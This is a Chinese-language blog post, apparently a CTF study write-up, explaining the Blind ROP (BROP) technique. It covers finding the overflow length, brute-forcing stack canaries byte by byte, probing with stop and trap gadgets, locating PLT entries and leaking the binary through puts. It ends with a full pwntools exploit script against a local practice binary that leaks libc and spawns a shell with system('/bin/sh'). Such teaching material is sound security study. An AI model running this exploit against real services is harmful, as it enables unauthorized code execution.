---
layout: post
title: BROP(Blind ROP)
category: StackOverflow
date: 2023-9-21 12:00:00
---
BROP的基础流程
<!-- more -->
# BROP

`Blind-ROP`，也就是盲打！其实是没有源程序的情况下的一种攻击思路。

大概步骤分为几步：

- 判断栈溢出的长度
- Stack Reading（泄露`canaries`，`ebp`，`return address`）
- Blind ROP: 找到合适的`gadgets`，并用来控制输出函数（`puts(),write()`）的参数。
- 使用输出函数找到更多的`gadgets`以便于编写`exp`。

## 判断栈溢出长度

最简单的一步，从1开始暴力枚举，直到发现程序崩溃。

这里提一嘴，假如发现使得程序溢出的字节数不是64位的倍数，考虑是不是读入了一个回车。

## Stack Reading

经典栈布局：

```
buffer|canary|saved fame pointer|saved returned address
low address->                            ->high address
```

枚举后可以找到`buffer`的长度，但明显不够：我们不知道`canary`的值，之后的`ebp`等其他值也不知道。

这里先说一下`canary`，其实上面也写了，这是一个`cookie`信息，是为了防止栈溢出的，简略的说就是这个值要是被修改了，就说明可能发生了栈溢出，程序将会`crash`。所以在攻击的时候是需要保持`canary`不变的。

然而，这些值也可以爆破。好好好

但当然不能直接嗯爆破，毕竟64位程序就有$2^{64}$种可能。这里用一下`paper`里面的图：

![image-20221210184219331](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211724463.png)

其实也就是按字节爆破，和直接爆破的区别就是，以64位程序为例子，按字节爆破只需要 $8*2^{8} = 2048$ 次，因为我们是能够判断前面的字节是否匹配成功的。32位只需要 $4*2^{8}=1024$ 次。

## Blind ROP

首先我们需要利用一些关键`gadgets`，这里我们称为`BROP gadgets`，也就是之前在`libc_csu_init`里面结尾处的`gadgets`。为什么？因为这里能有控制两个关键的传参的寄存器`rdi`和`rsi`的`gadgets`。（怎么取到`rdi`和`rsi`在`ret2csu`那一节）。

在`write()`函数中，第三个参数仅仅是用来控制输出的字符串的长度，**不为0即可**。而`pop rdx; ret`这种`gadgets`是很少的，而当执行`strcmp()`的时候，`rdx`会被设置为将要被比较的字符串的长度，因此可以找到`strcmp`函数即可控制`rdx`。

但我们又不知道地址，怎么找到`BROP gadgets`呢？先看下面：

#### stop gadgets && trap gadgets

重头戏，特地搞个小标题。

`stop gadgets`和`trap gadgets`是两种特殊的`gadgets`；我们先寻找到这两种`gadgets`，以此找到其他的`gadgets`。

先说`trap gadgets`，很容易理解，也就是**会让程序发生崩溃**的一段代码。

`stop gadgets`呢，就是让程序**不发生崩溃**，但是又做出一定响应的一段代码。**TODO**

再引入一个概念：`Probe`，也就是探针，就是我们**想要探测的代码地址**。若程序是64位程序，可以直接从`0x400000`尝试。假如不成功，可能程序开启了`PIE`或者是32位程序。

试想这样一种栈：

```
Buffer|return address(probe)|stop gadgets 或 trap gadgets
low address->                            ->high address
```

这样一来，程序会去执行`probe`处的一小段代码，若这段代码没有任何对栈的操作，我们知道它是会返回到我们设置的`stop gadgets`或`trap gadgets`的。

更详细的说，可以通过这种方式**找到一个不会对栈进行`pop`操作的`gadgets`**：

```
Buffer|probe|stop|trap(trap|trap|...)
low address->                            ->high address
```

这样一来，若`probe`处没有`pop`操作，它便会执行`stop gadgets`，不会崩溃；若有`pop`操作，执行的便是`trap gadgets`，程序将会崩溃。因此找到一个不会崩溃的地方便是一个没有`pop`操作的`gadgets`，例如`xor eax, eax;ret`或者是`ret`这种。

以此类推，这种栈可以找到有一个`pop`操作的`gadgets`：

```
Buffer|probe|trap|stop|trap(trap|trap...)
```

这个可以找到有6个`pop`操作的`gadgets`：

```
Buffer|probe|trap|trap|trap|trap|trap|trap|stop|trap(trap|trap...)
low address->                            ->high address
```

**而像`BROP gadgets`这样一下弹出6个寄存器的`gadgets`程序中并不常见。因此，如果我们发现了这种`gadgets`，那么有很大可能性这个`gadgets`就是`BROP gadgets`！**由此我们可以通过地址偏移得到`libc_csu_init`里面的所有`gadgets`。

补充说明，`probe`本身可能是`stop gadgets`。可以用以下栈排除（正常执行的话即是`stop gadgets`）：

```
Buffer|probe|trap|trap(|trap|trap...)
```

找到`BROP gadgets`后，要看看可能会是`add rsp, 8`开始的，是的话偏移8个字节。

#### 控制rdx

上面已经讲解了如何通过`stop gadgets`和`trap gadgets`来控制前两个参数。而我们知道`strcmp()`只有两个参数嘛，因此假如我们有了`strcmp`和前两个参数的地址，我们便可以控制`rdx`。此处要注意，`strcmp(param1, param2)`需要两个参数都是可读的地址才可以。在没有开启`PIE`时，64位程序的`0x400000`处有7个非零字节，我们可以使用。

因此，目前要实现`write(param1, param2, param3)`仅剩一步：获取`write()`的地址，也就是`write_plt()`的地址。（`strcmp()`一样，都在`plt`表里面）

#### 寻找PLT表

寻找`plt`表的目的是，找出其中的`write_plt`或者是`puts_plt`等便于我们使用。

来看看`plt`表：

![image-20221210211419513](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211724280.png)

我们知道`plt`表中的三行，第一行是去`got`表查看（假如`got`表还没有，就是跳到下一行），第二三行是查找地址的意思。字节数可以看到分别是六字节、五字节、五字节，加起来十六字节。

每一个`plt`表项是16字节。因此，假如发现了**一系列的**长度为16的没有使得程序崩溃的代码段，那么很有可能遇到了`plt`表。此外，还可以通过前后偏移6字节来判断出于`plt`表中间还是出于开头（可以看到前6个字节是第一行，也就是去找`got`，因此在开头的话偏移6个字节是不会崩溃的）。

只要找到了`plt`表，我们遍历`plt`表即可获得里面的函数地址。

找到`puts(param1)`是比较简单的，如下面的`payload`：

```python
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

若`addr`处是`puts`函数，那么将会输出`0x400000`处的7个非零字节（`\x7fELF`）。

这里补充写一下，假**如`puts_plt`是`plt`表中的第一个函数，那么在`puts_plt`之前的地址开始调用，也可能会调用到`puts`**。怎么找到`puts_plt`的开头地址呢？

可以使用两个`payload`，一个是上面那个，另一个是：

```python
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr+6)+p64(stop_gadget)
```

只要两个`payload`都会输出`\x7fELF`，那么说明肯定此时`addr`就是`put_plt`开头了。

而`write(file* fp, param2, param3)`的第一个参数是文件描述符，我们需要找到文件描述符的值。这个比较麻烦，`wiki`上面是这么说的：

![image-20221210212904866](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211724163.png)

到这里，我们已经可以控制输出函数，那么我们便可以输出`.text`段的其它内容或者是其它`gadgets`，并找到其他函数，以便于完成攻击。

另一个常用思路是，根据获取的`puts`等`plt`表函数获取`got`表的内容，然后依次以此泄露`libc`版本来使用其他函数。使用`puts_plt`将从`0x400000`开始的`1k`个字节全部保存到文件，然后使用`ida`反编译即可查看。这里写一下代码和效果：

```python
def leak(length, pop_rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = length*b'a' + p64(pop_rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        if b'WelCome' in data:
            data = data[:data.index(b"\nWelCome")]
        else:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        info('failure in {}'.format(leak_addr))
        return None
    
if __name__ == '__main__':
    result = b""
    addr = 0x400000
    while addr < 0x401000:
        info("starting to deal {}".format(hex(addr)))
        data = leak(length, pop_rdi_ret, puts_addr, addr,stop_gadget)
        if data is None:
            continue
        else:
            result += data
        addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)
```

用上面的代码将整个文件的前面的部分输出到文件，使用`ida`反编译。

需要注意的是如果泄露出来的是 “”, 那说明我们遇到了`'\x00'`，因为 `puts` 是输出字符串，字符串是以`'\x00'`为终止符的。之后利用 `ida` 打开 `binary` 模式，首先在 `edit->segments->rebase program` 将程序的基地址改为 `0x400000`，然后找到偏移 `0x560` 处。

![image-20221211230812095](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211724326.png)

可以看到，`puts_got`的地址是`0x601018`。这个是没问题的，但`push`那个地址本来应该是`0`，但不知道怎么变成了`0A0A00`，有两个`0`变成`a`了，这个希望有师傅解答一下。

## exp

跟着`wiki`一步一步写的，最后也是有点乱

```python
from pwn import *
from LibcSearcher import *

# sh = remote('127.0.0.1', 10001)


def get_stack_length():
    length = 0
    while True:
        try:
            sh = remote('127.0.0.1', 10001)
            payload = length*b'a'
            sh.recvuntil('password?\n')
            sh.sendline(payload)
            output = sh.recv()
            sh.close()
            if output.startswith(b'No password'):
                length += 1
                continue
        except EOFError:
            sh.close()
            success('length:' + str(length-1))
            return length - 1


def get_stop_addr(length):
    addr = 0x400600
    i = 0
    while True:
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('password?\n')
            payload = b'a'*length + p64(addr)
            sh.sendline(payload)
            sh.recv()
            sh.close()
            success('one stop gadget:0x%x' % (addr))
            return addr
        except EOFError:
            info('no 0x%x' % addr)
            addr += 1
            sh.close()


def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = b'a'*length + \
            p64(addr) + 6*p64(0xdeadbeaf) + \
            p64(stop_gadget) + 10*p64(stop_gadget)
        sh.sendline(payload)
        output = sh.recv(timeout=3)
        sh.close()
        info(b'output:' + output)
        if output.startswith(b'WelCome'):
            return True

    except EOFError:
        sh.close()
        return False


def check_BROP_gadgets(length, addr):
    try:
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil('password?\n')
        payload = b'a'*length + p64(addr) + p64(0xdeadbeaf)*100
        sh.sendline(payload)
        output = sh.recv()
        sh.close()
        info('stop gadget, not BROP gadgets')
        return False
    except EOFError:
        sh.close()
        return True


def get_puts_addr(length, pop_rdi_ret, stop_gadget):
    addr = 0x400550
    while True:
        info(hex(addr))
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil('password?\n')
        payload = b'a'*length + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith(b'\x7fELF'):
                success('finding puts addr:0x%x' % addr)
                return addr
        except EOFError:
            pass
        finally:
            sh.close()
            addr += 1


def get_puts_start_addr(length, pop_rdi_ret, stop_gadget, addr):
    info('we has find put_plt, now try to find the start:')
    while True:
        info(hex(addr))
        flag1 = False
        flag2 = False
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = length*b'a' + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content1 = sh.recv(timeout=2)
            if content1.startswith(b'\x7fELF'):
                flag1 = True
        except EOFError:
            flag1 = False
        sh.close()
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = length*b'a' + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr+6) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content2 = sh.recv(timeout=2)
            info(b'content2:' + content2)
            if content2.startswith(b'\x7fELF'):
                flag2 = True
        except EOFError:
            flag2 = False
        info('flag1:{}, flag2:{}'.format(flag1, flag2))
        if (flag1 & flag2):
            success('get the start of puts_plt addr:' + hex(addr))
            return addr
        else:
            addr += 1


def leak(length, pop_rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = length*b'a' + p64(pop_rdi_ret) + \
        p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        if b'WelCome' in data:
            data = data[:data.index(b"\nWelCome")]
        else:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        info('failure in {}'.format(leak_addr))
        return None


if __name__ == '__main__':

    # length = get_stack_length()
    length = 72
    stop_gadget = 0x4006b6  # return to the start
    # stop_gadget = get_stop_addr(length)
    info('start to find brop gadgets:')
    brop_gadgets = 0x4007ba  # 0x4007ba for add rsp, 6
    '''
    while True:
        info('Testing 0x%x'%brop_gadgets)
        if get_brop_gadget(length, stop_gadget, brop_gadgets):
            if check_BROP_gadgets(brop_gadgets, length):
                success('success in finding brop gadgets: 0x%x', brop_gadgets)
                break
        else:
            brop_gadgets += 1
    '''
    pop_rdi_ret = brop_gadgets + 9
    # puts_addr = get_puts_addr(length, pop_rdi_ret, stop_gadget)
    # puts_addr = get_puts_start_addr(
    #    length, pop_rdi_ret, stop_gadget, puts_addr)
    puts_addr = 0x400560
    '''
    get puts_got
    result = b""
    addr = 0x400000
    while addr < 0x401000:
        info("starting to deal {}".format(hex(addr)))
        data = leak(length, pop_rdi_ret, puts_addr, addr,stop_gadget)
        if data is None:
            continue
        else:
            result += data
        addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)
    '''

   # retn_addr = get_retn_gadget(length, stop_gadget)

    retn_addr = 0x400541
    puts_got = 0x601018
    #sh = remote('127.0.0.1', 10001)
    context(log_level='debug')
    sh = process('./brop')
    sh.recvuntil('password?\n')
    payload = length*b'a' + p64(pop_rdi_ret) + \
        p64(puts_got) + p64(retn_addr) + p64(puts_addr) + p64(stop_gadget)
    sh.sendline(payload)
    #data = sh.recvuntil(b'\nWelCome', drop=True)
    #puts_libc = u64(data.ljust(8, b'\x00'))
    puts_libc = u64(sh.recv(6).ljust(8, b'\x00'))
    libc = LibcSearcher('puts', puts_libc)
    libc_base = puts_libc - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    str_bin_sh = libc_base + libc.dump('str_bin_sh')


    '''
    libc = ELF('./libc.so')
    libc_base = puts_libc - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    str_bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    '''

    sh.recvuntil(b'password?\n')
    payload = length*b'a' +  \
        p64(pop_rdi_ret) + p64(str_bin_sh) +  p64(system_addr) + p64(stop_gadget)
    pid = util.proc.pidof(sh)[0]
    print(pid)
    pause()
    sh.sendline(payload)
    sh.interactive()
```

# 